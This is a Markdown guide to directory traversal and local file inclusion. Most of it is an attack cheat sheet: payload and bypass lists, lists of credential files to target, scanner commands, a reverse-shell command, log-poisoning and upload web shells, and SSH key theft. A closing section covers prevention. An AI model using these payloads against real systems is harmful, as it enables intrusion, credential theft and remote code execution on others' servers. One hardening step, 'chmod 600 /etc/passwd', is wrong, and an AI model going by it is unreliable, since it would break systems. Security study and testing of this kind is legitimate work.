# Directory Traversal / Path Traversal - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Attack Mechanics](#attack-mechanics)
3. [Detection Techniques](#detection-techniques)
4. [Scanning Tools](#scanning-tools)
5. [Exploitation Scenarios](#exploitation-scenarios)
6. [Bypass Techniques](#bypass-techniques)
7. [OS-Specific Attacks](#os-specific-attacks)
8. [Advanced Exploitation](#advanced-exploitation)
9. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

Directory Traversal (also known as Path Traversal or Directory Climbing) is a web security vulnerability that allows attackers to access files and directories stored outside the web root folder by manipulating file path parameters.

**Impact**:
- Access to sensitive configuration files
- Source code disclosure
- Credential theft
- System information disclosure
- Remote code execution (when combined with file upload)
- Log file access (may contain tokens, sessions)

**Common Vulnerable Parameters**:
- `file=`, `filename=`, `path=`, `page=`
- `include=`, `template=`, `document=`
- `load=`, `read=`, `download=`

---

## Attack Mechanics

### Basic Traversal Sequences

**Unix/Linux**:
```
../
../../
../../../
../../../../
```

**Windows**:
```
..\
..\..\
..\..\..\
..\..\..\..\

Also accepts forward slashes:
../
../../
```

### Absolute vs Relative Paths

**Relative Path Exploitation**:
```
Normal: /var/www/html/files/document.pdf
Attack: ../../../../etc/passwd
Result: /var/www/html/files/../../../../etc/passwd → /etc/passwd
```

**Absolute Path Exploitation**:
```
If application allows:
file=/etc/passwd
file=C:\Windows\System32\drivers\etc\hosts
```

### Interesting Files to Target

**Linux/Unix**:
```
/etc/passwd                    # User accounts
/etc/shadow                    # Password hashes (requires root)
/etc/hosts                     # DNS resolution
/etc/hostname                  # System hostname
/etc/issue                     # OS identification
/etc/apache2/apache2.conf      # Apache config
/etc/nginx/nginx.conf          # Nginx config
/etc/mysql/my.cnf              # MySQL config
/etc/ssh/sshd_config           # SSH config
/root/.ssh/id_rsa              # SSH private key
/root/.bash_history            # Command history
/var/log/apache2/access.log    # Web server logs
/var/log/nginx/access.log
/var/log/auth.log              # Authentication logs
/proc/self/environ             # Environment variables
/proc/self/cmdline             # Current process command line
/proc/self/fd/0-255            # File descriptors
/home/user/.ssh/id_rsa         # User SSH keys
~/.aws/credentials             # AWS credentials
~/.docker/config.json          # Docker registry credentials
```

**Windows**:
```
C:\Windows\System32\drivers\etc\hosts    # Hosts file
C:\Windows\win.ini                       # Windows config
C:\Windows\System32\config\SAM           # User credentials (requires admin)
C:\inetpub\wwwroot\web.config            # IIS config
C:\xampp\htdocs\config.php               # XAMPP config
C:\wamp\www\config.php                   # WAMP config
C:\Windows\Panther\Unattend.xml          # Windows setup (may contain passwords)
C:\Windows\System32\inetsrv\config\applicationHost.config  # IIS config
C:\Program Files\FileZilla Server\FileZilla Server.xml     # FTP credentials
C:\Users\Administrator\.ssh\id_rsa       # SSH key
C:\Users\Administrator\Desktop\passwords.txt
```

**Web Application Files**:
```
.env                           # Environment variables (Laravel, etc.)
config.php                     # PHP configuration
wp-config.php                  # WordPress database credentials
configuration.php              # Joomla config
settings.php                   # Drupal config
database.yml                   # Rails database config
.git/config                    # Git configuration
.git/HEAD                      # Current branch
.svn/entries                   # SVN metadata
composer.json                  # PHP dependencies
package.json                   # Node.js dependencies
```

---

## Detection Techniques

### Manual Testing

**Step 1: Identify File Parameters**
```
Look for:
- Download functionality
- File viewers/readers
- Template loading
- Include functionality
- Document access
```

**Step 2: Basic Probes**
```
Original: https://target.com/download?file=document.pdf

Test:
https://target.com/download?file=../../../etc/passwd
https://target.com/download?file=..\..\..\..\windows\win.ini
https://target.com/download?file=/etc/passwd
https://target.com/download?file=C:\Windows\win.ini
```

**Step 3: Response Analysis**
```
Vulnerable indicators:
- File contents displayed
- Different response length
- Error messages revealing path information
- Different response time
```

### Automated Detection

**Common Payloads**:
```
../
..\
..;/
%2e%2e%2f
%2e%2e/
..%2f
%2e%2e%5c
.%2e/
%252e%252e%252f
....//
..../
```

### Error-Based Detection

**Application Errors**:
```
Warning: include(../../../../etc/passwd): failed to open stream
File not found: /var/www/html/files/../../../../etc/passwd
Could not open file: ../../config.php
```

---

## Scanning Tools

### 1. DotDotPwn

```bash
# HTTP GET parameter
dotdotpwn -m http-url -u http://target.com/path/TRAVERSAL -k "root" -f /etc/passwd
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd

# HTTP POST parameter
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -M POST -d "file=TRAVERSAL"

# Depth specification
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -d 10

# Custom URL pattern
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -U "https://target.com/download?file=TRAVERSAL"

# Search for specific file
dotdotpwn -m http -h target.com -x 80 -k config.php

# FTP module
dotdotpwn -m ftp -h target.com -f /etc/passwd

# TFTP module
dotdotpwn -m tftp -h target.com -f /etc/passwd

# Custom user agent
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -a "CustomAgent/1.0"

# Use proxy
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -p 127.0.0.1:8080

# Quiet mode (less output)
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -q
```

### 2. ffuf (Fast Fuzzer)

```bash
# Basic LFI fuzzing
ffuf -u https://target.com/page?file=FUZZ -w lfi-wordlist.txt

# Match specific response codes
ffuf -u https://target.com/page?file=FUZZ -w lfi-wordlist.txt -mc 200

# Filter by response size
ffuf -u https://target.com/page?file=FUZZ -w lfi-wordlist.txt -fs 1234

# POST request
ffuf -u https://target.com/page -w lfi-wordlist.txt -X POST -d "file=FUZZ"

# Custom headers
ffuf -u https://target.com/page?file=FUZZ -w lfi-wordlist.txt -H "Authorization: Bearer TOKEN"

# Match regex in response
ffuf -u https://target.com/page?file=FUZZ -w lfi-wordlist.txt -mr "root:"

# Wordlist location
/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
```

### 3. Burp Suite

**Intruder Setup**:
```
1. Send request to Intruder
2. Mark file parameter as insertion point
3. Load payload list:
   - Add from file: /usr/share/seclists/Fuzzing/LFI/
   - Or use built-in Burp lists
4. Configure grep-match for: root:, [extensions], etc.
5. Start attack
6. Review responses with different lengths
```

**Useful Extensions**:
- **LFI Scanner**: Automated LFI detection
- **Param Miner**: Discovers hidden parameters
- **Collaborator Everywhere**: Detects blind LFI via OOB

### 4. LFISuite

```bash
# Interactive mode
python lfisuite.py

# Direct URL scan
python lfisuite.py -u "https://target.com/page?file=test"

# Crawl and scan
python lfisuite.py -u "https://target.com" --crawl

# Custom payloads file
python lfisuite.py -u "https://target.com/page?file=test" -P payloads.txt

# Verbose output
python lfisuite.py -u "https://target.com/page?file=test" -v
```

### 5. Kadimus

```bash
# Basic scan
kadimus -u "https://target.com/page?file=test"

# Scan with specific technique
kadimus -u "https://target.com/page?file=test" --technique=php://input

# Scan all techniques
kadimus -u "https://target.com/page?file=test" -A

# Remote code execution
kadimus -u "https://target.com/page?file=test" -C "<?php system('id'); ?>"

# Get source code
kadimus -u "https://target.com/page?file=test" --source=/etc/passwd

# Connect to reverse shell
kadimus -u "https://target.com/page?file=test" -T 192.168.1.10 4444

# POST request
kadimus -u "https://target.com/page" -B "file=test" --technique=expect://
```

### 6. Wfuzz

```bash
# Basic LFI fuzzing
wfuzz -w lfi-list.txt https://target.com/page?file=FUZZ

# Hide specific response codes
wfuzz -w lfi-list.txt --hc 404,403 https://target.com/page?file=FUZZ

# Hide specific response size
wfuzz -w lfi-list.txt --hs 1234 https://target.com/page?file=FUZZ

# Show only specific size
wfuzz -w lfi-list.txt --ss 2000-5000 https://target.com/page?file=FUZZ

# Multiple injection points
wfuzz -w users.txt -w lfi-list.txt https://target.com/FUZZ/page?file=FUZ2Z
```

### 7. Manual Testing Tools

**curl**:
```bash
# Basic test
curl "https://target.com/page?file=../../../../etc/passwd"

# Save response
curl "https://target.com/page?file=../../../../etc/passwd" -o output.txt

# With cookies
curl "https://target.com/page?file=../../../../etc/passwd" -b "session=abc123"

# POST request
curl "https://target.com/page" -d "file=../../../../etc/passwd"
```

**Python Script**:
```python
import requests

payloads = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd'
]

for payload in payloads:
    r = requests.get(f'https://target.com/page?file={payload}')
    if 'root:' in r.text:
        print(f'[+] Vulnerable with: {payload}')
        break
```

---

## Exploitation Scenarios

### Scenario 1: Configuration File Disclosure

```bash
Target: https://shop.com/download?file=invoice.pdf

# Test for traversal
https://shop.com/download?file=../../../../etc/passwd

# If successful, target config files
https://shop.com/download?file=../../../../var/www/html/.env
https://shop.com/download?file=../../../../var/www/html/config.php

# Retrieved .env contains:
DB_HOST=localhost
DB_USER=admin
DB_PASS=SuperSecret123!
DB_NAME=shop_db
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

### Scenario 2: Source Code Disclosure

```bash
# Access PHP source using php://filter
https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php

# Response contains base64 encoded source
PD9waHAgLy8gZGVjb2RlIHRvIGdldCBzb3VyY2U=

# Decode:
echo "PD9waHAgLy8gZGVjb2RlIHRvIGdldCBzb3VyY2U=" | base64 -d

# Reveals source code, may contain:
- Hard-coded credentials
- Hidden functionality
- Vulnerable code patterns
- API keys
```

### Scenario 3: Log Poisoning to RCE

```bash
# Step 1: Inject code into log file
curl "https://target.com/page" -A "<?php system(\$_GET['cmd']); ?>"

# Step 2: Include log file via LFI
https://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id

# Alternative log files:
/var/log/nginx/access.log
/var/log/apache2/error.log
/var/log/vsftpd.log
/var/log/sshd.log
```

### Scenario 4: SSH Key Theft

```bash
# Access user's private key
https://target.com/page?file=../../../../root/.ssh/id_rsa
https://target.com/page?file=../../../../home/developer/.ssh/id_rsa

# Save key
curl "https://target.com/page?file=../../../../root/.ssh/id_rsa" -o id_rsa

# Use key for SSH access
chmod 600 id_rsa
ssh -i id_rsa root@target.com
```

### Scenario 5: Proc Filesystem Exploitation (Linux)

```bash
# Environment variables
https://target.com/page?file=../../../../proc/self/environ

# May reveal:
AWS_ACCESS_KEY_ID=...
AWS_SECRET_ACCESS_KEY=...
DB_PASSWORD=...
API_KEY=...

# Command line of current process
https://target.com/page?file=../../../../proc/self/cmdline

# File descriptors (may include temporary files, database connections)
https://target.com/page?file=../../../../proc/self/fd/0
https://target.com/page?file=../../../../proc/self/fd/1
https://target.com/page?file=../../../../proc/self/fd/10
```

---

## Bypass Techniques

### 1. Encoding Bypasses

**URL Encoding**:
```
../ = %2e%2e%2f
../ = %2e%2e/
..\ = %2e%2e%5c
```

**Double URL Encoding**:
```
../ = %252e%252e%252f
```

**16-bit Unicode Encoding**:
```
../ = %u002e%u002e%u002f
```

**UTF-8 Encoding**:
```
../ = %c0%ae%c0%ae%c0%af
```

### 2. Path Truncation

**Null Byte Injection** (PHP < 5.3):
```
../../../../etc/passwd%00.jpg

Explanation:
- Application expects .jpg extension
- Null byte terminates string in C
- PHP ignores everything after %00
```

**Long Path Truncation**:
```
../../../../etc/passwd/././././././[repeat many times]

Explanation:
- Some systems have max path length
- Exceeding it truncates the path
```

### 3. Bypassing Filters

**If "../" is filtered**:
```
....//
..././
....\/
..././
```

**If "\..\" is filtered**:
```
....\\
..\.\
```

**If Path sanitized once**:
```
....//....//....//etc/passwd

After one removal: ../../../etc/passwd
```

**Mixed Slashes**:
```
..\/..\/..\/etc/passwd
..\/..\/..\etc\passwd
```

### 4. Bypassing Absolute Path Restrictions

**If application prepends directory**:
```
Prepends: /var/www/html/files/

Attack: ../../../../etc/passwd
Result: /var/www/html/files/../../../../etc/passwd → /etc/passwd

Attack: /etc/passwd (if absolute paths allowed)
```

**If application appends extension**:
```
Appends: .pdf

Attack: ../../../../etc/passwd%00
Result: /etc/passwd (null byte truncates .pdf)

Attack (newer PHP): ../../../../etc/passwd/.
```

### 5. Bypassing Pattern Matching

**If "etc/passwd" is filtered**:
```
/e?c/p?sswd
/e*c/p*sswd
/etc/./passwd
/etc//passwd
/etc\passwd (Windows)
```

**Case Variation** (Windows only):
```
C:\WiNdOwS\sYsTeM32\dRiVeRs\eTc\hOsTs
```

### 6. Protocol Wrappers (PHP)

**php://filter**:
```
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=config.php
```

**php://input**:
```
# Read raw POST data
# Can be used for RCE if code is executed
POST /page?file=php://input
<?php system('id'); ?>
```

**data://**:
```
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**expect://** (if expect extension enabled):
```
expect://id
expect://whoami
```

**zip://**:
```
# Upload zip containing shell.php
# Access via: zip://uploads/file.zip%23shell.php
```

**phar://**:
```
phar://uploads/file.zip/shell.php
```

---

## OS-Specific Attacks

### Linux/Unix

**System Files**:
```
/etc/passwd
/etc/shadow (requires root)
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
```

**Web Server Configs**:
```
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf
/etc/nginx/nginx.conf
/usr/local/apache2/conf/httpd.conf
```

**Application Configs**:
```
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/usr/share/nginx/html/.env
```

**Logs**:
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/messages
/var/log/mysql/error.log
```

### Windows

**System Files**:
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System.ini
C:\Windows\WindowsUpdate.log
C:\Windows\System32\config\SAM
```

**IIS Configs**:
```
C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
```

**Application Configs**:
```
C:\xampp\htdocs\config.php
C:\wamp\www\config.php
C:\inetpub\wwwroot\App_Data\database.config
```

**Logs**:
```
C:\Windows\System32\LogFiles\
C:\inetpub\logs\LogFiles\
C:\Windows\System32\winevt\Logs\
```

---

## Advanced Exploitation

### Combining with File Upload

```bash
# Step 1: Upload file with PHP code in filename
# Upload: <?php system($_GET['cmd']); ?>.jpg
# Saved as: uploads/shell.jpg

# Step 2: Include uploaded file
https://target.com/page?file=../../../../var/www/html/uploads/shell.jpg&cmd=id
```

### Race Condition LFI

```python
# Some applications delete uploaded files after processing
# Exploit: Upload file and include it before deletion

import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('https://target.com/upload', files=files)

def include():
    requests.get('https://target.com/page?file=uploads/shell.php&cmd=id')

# Race condition
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=include)
t1.start()
t2.start()
```

### Server-Side Includes (SSI) via LFI

```bash
# If server processes SSI
<!--#exec cmd="id" -->

# Include via LFI after injecting into log/upload
https://target.com/page?file=../../../../var/log/apache2/access.log
```

---

## Prevention & Mitigation

### 1. Input Validation

```php
// Whitelist allowed files
$allowed_files = ['report.pdf', 'invoice.pdf', 'terms.pdf'];
$file = $_GET['file'];

if (!in_array($file, $allowed_files)) {
    die('Invalid file');
}
```

### 2. Basename Validation

```php
// Use basename to prevent directory traversal
$file = basename($_GET['file']);
$filepath = '/var/www/files/' . $file;

// Still vulnerable to: ?file=../../../etc/passwd on some systems
// Better: combine with whitelist
```

### 3. Path Canonicalization

```php
// PHP
$base_directory = '/var/www/files/';
$requested_file = $_GET['file'];
$full_path = realpath($base_directory . $requested_file);

// Verify path starts with base directory
if (strpos($full_path, $base_directory) !== 0) {
    die('Invalid path');
}

// Now safe to use $full_path
```

```python
# Python
import os

base_directory = '/var/www/files/'
requested_file = request.GET['file']
full_path = os.path.realpath(os.path.join(base_directory, requested_file))

if not full_path.startswith(base_directory):
    return 'Invalid path'
```

```javascript
// Node.js
const path = require('path');

const baseDirectory = '/var/www/files/';
const requestedFile = req.query.file;
const fullPath = path.resolve(baseDirectory, requestedFile);

if (!fullPath.startsWith(baseDirectory)) {
    res.send('Invalid path');
}
```

### 4. Disable Dangerous Functions

**PHP (php.ini)**:
```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
allow_url_fopen = Off
allow_url_include = Off
```

### 5. Filesystem Permissions

```bash
# Restrict web server user permissions
chown -R www-data:www-data /var/www/html/files/
chmod 755 /var/www/html/files/

# Sensitive files should not be readable by web server
chmod 600 /etc/passwd
chown root:root /etc/passwd
```

### 6. Web Server Configuration

**Apache (.htaccess)**:
```apache
# Deny access to sensitive files
<Files ".env">
    Require all denied
</Files>

<FilesMatch "\.(conf|ini|log)$">
    Require all denied
</FilesMatch>
```

**Nginx**:
```nginx
location ~ /\.env {
    deny all;
}

location ~ \.(conf|ini|log)$ {
    deny all;
}
```

### 7. Use APIs Instead of File Parameters

```php
// Instead of: ?file=report.pdf
// Use: ?report_id=123

$report_id = (int)$_GET['report_id'];
$file_mapping = [
    1 => '/var/www/files/report1.pdf',
    2 => '/var/www/files/report2.pdf'
];

if (isset($file_mapping[$report_id])) {
    readfile($file_mapping[$report_id]);
}
```

### Security Checklist

- [ ] All file operations use whitelist validation
- [ ] Path canonicalization implemented
- [ ] No direct user input in file paths
- [ ] Sensitive files protected by filesystem permissions
- [ ] Web server configured to deny sensitive files
- [ ] Dangerous PHP functions disabled
- [ ] Regular security scanning
- [ ] Logging and monitoring for traversal attempts
- [ ] Input validation on all parameters
- [ ] Null byte filtering (even on modern PHP)

---

**Additional Resources**:
- OWASP Path Traversal
- HackTricks - File Inclusion
- PayloadsAllTheThings - File Inclusion
